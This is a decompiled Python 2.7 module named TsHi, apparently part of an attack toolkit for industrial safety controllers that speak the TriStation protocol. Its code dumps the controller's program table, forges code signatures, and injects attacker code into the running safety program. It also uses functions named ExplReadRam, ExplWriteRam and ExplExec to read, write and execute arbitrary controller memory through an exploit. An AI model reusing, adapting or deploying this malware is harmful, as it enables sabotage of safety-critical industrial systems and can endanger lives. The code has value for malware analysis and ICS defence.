# uncompyle6 version 2.14.1
# Python bytecode 2.7 (62211)
# Decompiled from: Python 2.7.12 (default, Nov 19 2016, 06:48:10) 
# [GCC 5.4.0 20160609]
# Embedded file name: TsHi.pyc
# Compiled at: 2017-08-04 08:04:01
import TsBase, struct, sh, crc, time
mp_ram_table = [
 [
  0, 16777216],
 [
  34603008, 35667968],
 [
  41943040, 50331648]]

def ram_check(adr, size, table=mp_ram_table):
    end_adr = adr + size
    adr_fine = False
    for i in table:
        if adr >= i[0] and end_adr <= i[1]:
            adr_fine = True

    if adr_fine == False:
        return -1
    return 0


def TScksum(data):
    sum = 826366262
    data = data + struct.pack('<I', 31415936)
    for i in data:
        sum = (sum & 2147483647) << 1 | sum >> 31
        sum = sum + ord(i)

    return sum


append_sign = 2068988371

def MyCodeSign(code):
    return code + struct.pack('<I', crc.crc32(code) ^ append_sign)


def MyCodeCheck(code):
    if code == None or len(code) < 8:
        return False
    code_sign = struct.unpack('<I', code[-4:])[0]
    code_crc = crc.crc32(code[:-4])
    return code_crc ^ code_sign == append_sign


class TsHi(TsBase.TsBase):

    def ReadFunctionOrProgram(self, id, is_func):
        size_read = 0
        full_size = 4
        dump_func = self.UploadProgram
        if is_func:
            dump_func = self.UploadFunction
        dumped_code = ''
        while size_read < full_size:
            data = dump_func(id, size_read)
            if data == None or len(data) < 8:
                return
            next, full_size, notused, reply_size = struct.unpack('<HHHH', data[0:8])
            reply_data = data[8:]
            if 4 * reply_size != len(reply_data):
                return
            dumped_code += reply_data
            size_read += reply_size

        if len(dumped_code) < 4:
            return
        sign = struct.unpack('<I', dumped_code[-4:])[0]
        dumped_code = dumped_code[:-4]
        test_sign = TScksum(dumped_code)
        if test_sign != sign:
            print 'bad code sign'
            return
        return dumped_code

    def WriteFunctionOrProgram(self, id, next, is_func, data=''):
        if len(data) % 4 != 0:
            data = data + (4 - len(data) % 4) * '\x00'
        full_size = len(data)
        write_func = self.AllocateProgram
        if is_func:
            write_func = self.AllocateFunction
        if full_size == 0:
            return write_func(id, next, full_size, 0, '')
        sign = TScksum(data)
        data = data + struct.pack('<I', sign)
        full_size = len(data)
        total_chunks = full_size / 4
        sent_chunks = 0
        while sent_chunks < total_chunks:
            cur_send = min(total_chunks - sent_chunks, 256)
            data_to_send = data[sent_chunks * 4:(sent_chunks + cur_send) * 4]
            result = write_func(id, next, total_chunks, sent_chunks, data_to_send)
            if not result:
                return False
            sent_chunks += cur_send

        return True

    def ReadFunction(self, id):
        return self.ReadFunctionOrProgram(id, True)

    def ReadProgram(self, id):
        return self.ReadFunctionOrProgram(id, False)

    def WriteFunction(self, id, data=''):
        return self.WriteFunctionOrProgram(id, 0, True, data)

    def WriteProgram(self, id, next, data=''):
        return self.WriteFunctionOrProgram(id, next, False, data)

    def ParseProjectInfo(self, info):
        if info == None or len(info) < 74:
            return
        name = info[64:74]
        minor, major, timestamp = struct.unpack('<HHI', info[56:64])
        project = (name, major, minor, timestamp)
        loadIn, modIn, loadState, singleScan, cpValid, keyState, runState = struct.unpack('BBBBBBB', info[0:7])
        my, us, ds, heap_min, heap_max = struct.unpack('<IIIII', info[12:32])
        prinfo = {}
        prinfo['project'] = project
        prinfo['heap'] = (heap_min, heap_max)
        prinfo['key'] = keyState
        prinfo['run'] = runState
        prinfo['valid'] = cpValid
        prinfo['loadin'] = loadIn
        prinfo['modin'] = modIn
        prinfo['load'] = loadState
        prinfo['sscan'] = singleScan
        prinfo['fstat'] = info[40:44]
        return prinfo

    def GetProjectInfo(self):
        info = self.GetCpStatus()
        return self.ParseProjectInfo(info)

    def GetProgramTable(self):
        ptab = {}
        current_prog = 0
        while True:
            prog = self.UploadProgram(current_prog)
            if prog == None or len(prog) < 2:
                break
            next_prog = struct.unpack('<H', prog[0:2])[0]
            ptab[current_prog] = next_prog
            current_prog += 1

        final_error = self.ts_result()[0]
        if final_error != 208:
            return
        current_prog = 0
        total_len = 0
        try:
            while True:
                current_prog = ptab[current_prog]
                total_len += 1
                if current_prog == 0:
                    break
                if total_len > len(ptab):
                    return

        except KeyError:
            return

        if total_len != len(ptab):
            return
        return ptab

    def CountFunctions(self):
        cuf = 0
        while True:
            cuf += 16
            func = self.UploadFunction(cuf)
            if func == None:
                break

        final_error = self.ts_result()[0]
        if final_error != 208:
            return
        cuf -= 16
        while True:
            func = self.UploadFunction(cuf)
            if func == None:
                break
            cuf += 1

        final_error = self.ts_result()[0]
        if final_error != 208:
            return
        return cuf

    def SafeAppendProgramMod(self, code, force=False):
        print 'checking project state'
        cur_state = self.GetProjectInfo()
        if cur_state == None:
            print 'FAILED to get state'
            return False
        if cur_state['key'] != 1 and not force:
            print 'key NOT in PROGRAM'
            return False
        if cur_state['valid'] != 1 and not force:
            print 'program NOT VALID'
            return False
        if cur_state['run'] != 0 and not force:
            print 'program NOT in RUNNING'
            return False
        if cur_state['run'] == 3:
            print 'program in EXCEPTION, halting'
            self.HaltProgram()
        if cur_state['load'] == 5:
            if not force:
                print 'wrong program STATE'
                return False
            print 'cancelling previous download'
            self.CancelDownload()
        print 'dumping program table'
        prog_table = self.GetProgramTable()
        if prog_table == None or len(prog_table) < 1:
            print 'cannot parse PROG TABLE'
            return False
        prog_cnt = len(prog_table)
        print 'counting functions (slow)'
        func_count = self.CountFunctions()
        if func_count == None or func_count < 1:
            print 'cannot count FUNC'
            return False
        print 'performing program mod'
        first_try = self.AppendProgramMin(code, func_count, prog_cnt)
        if first_try == 0:
            print 'mod failed'
            return False
        if first_try == 2:
            print 'append used, progcnt + 1'
            prog_cnt += 1
        if force:
            self.RunProgram()
        print 'waiting for program to start'
        new_prog_state = self.WaitForStart()
        if new_prog_state == 0:
            print 'run success, mod success!'
            return True
        if new_prog_state == 3:
            print 'prog exception! trying to fix back'
            self.HaltProgram()
            second_try = self.AppendProgramMin('\xff\xff`8\x02\x00\x00D \x00\x80N', func_count, prog_cnt)
            self.RunProgram()
            new_prog_state = self.WaitForStart()
            if new_prog_state == 0:
                print 'exception FIXED by REMOVING our code'
            else:
                print 'NOT fixed! Total Failure'
            return False
        return

    def WaitForStart(self):
        attempts = 0
        while attempts < 100:
            attempts += 1
            new_status = self.GetProjectInfo()
            if new_status == None:
                return -1
            load_st = new_status['load']
            run_st = new_status['run']
            if run_st != 0 or load_st == 10:
                return run_st
            time.sleep(0.1)

        return -1

    def AppendProgramMin(self, code, funccnt, progcnt):
        print 'appending program'
        if funccnt <= 0 or progcnt <= 0:
            print 'wrong input params'
        max_prog_code = self.ReadProgram(progcnt - 1)
        max_prog_header = self.UploadProgram(progcnt - 1)
        if max_prog_code == None or max_prog_header == None:
            print 'cannot dump LAST PROG'
            return 0
        max_prog_next = struct.unpack('<H', max_prog_header[0:2])[0]
        if self.ReadProgram(progcnt) != None:
            print 'wrong prog count'
            return 0
        if self.ReadFunction(funccnt - 1) == None or self.ReadFunction(funccnt) != None:
            print 'wrong func count'
            return 0
        is_overwrite = False
        if MyCodeCheck(max_prog_code):
            print 'sign detected, using overwrite'
            is_overwrite = True
        else:
            print 'using append'
            progcnt += 1
        cur_state = self.GetProjectInfo()
        code = MyCodeSign(code)
        mod_attempts = 0
        is_success = False
        is_dl_allowed = False
        while mod_attempts < 2:
            print 'sending mod request, attempt %d' % (mod_attempts + 1)
            mod_attempts += 1
            is_dl_allowed = self.StartDownloadChange(cur_state['project'], cur_state['project'], funccnt, progcnt)
            if not is_dl_allowed:
                print 'Download NOT ALLOWED'
                self.CancelDownload()
                continue
            while True:
                if is_overwrite:
                    result = self.WriteProgram(progcnt - 1, max_prog_next, code)
                    if not result:
                        break
                else:
                    result = self.AllocateProgram(progcnt - 2, progcnt - 1)
                    if not result:
                        break
                    result = self.WriteProgram(progcnt - 1, max_prog_next, code)
                    if not result:
                        break
                is_success = True
                break

            if not is_success:
                self.CancelDownload()
                continue
            break

        if not is_dl_allowed:
            print 'code write not allowed'
            return 0
        if not is_success:
            print 'code write FAILURE, cancelling'
            result = self.CancelDownload()
            if not result:
                print 'cancel FAILURE'
            return 0
        print 'code write success, confirming'
        result = self.EndDownloadChange()
        if not result:
            print 'confirm FAILURE, cancelling'
            result = self.CancelDownload()
            if not result:
                print 'cancel FAILURE'
            return 0
        if is_overwrite:
            return 1
        return 2
        return

    def ExplReadRam(self, address, size, mp=255):
        if size > 1024 or size <= 0:
            return None
        if ram_check(address, size) != 0:
            return None
        return self.ExecuteExploit(23, struct.pack('<II', size, address))

    def ExplReadRamEx(self, address, size, mp=255):
        data = ''
        for i in xrange(0, size, 1024):
            offset = address + i
            size_to_read = min(size - i, 1024)
            r_data = self.ExplReadRam(offset, size_to_read, mp)
            if r_data == None:
                break
            data = data + r_data

        return data

    def ExplExec(self, address, mp=255):
        if address >= 1048576 or address <= 0:
            return None
        return self.ExecuteExploit(249, struct.pack('<I', address))

    def ExplWriteRam(self, address, data='', mp=255):
        size = len(data)
        if size > 1024 or size <= 0:
            return None
        if ram_check(address, size) != 0:
            return None
        return self.ExecuteExploit(65, struct.pack('<II', size, address) + data)

    def ExplWriteRamEx(self, address, data='', mp=255):
        size = len(data)
        for i in xrange(0, size, 1024):
            offset = address + i
            size_to_write = min(size - i, 1024)
            data_to_write = data[i:i + size_to_write]
            result = self.ExplWriteRam(offset, data_to_write, mp)
            if result == None:
                return False

        return True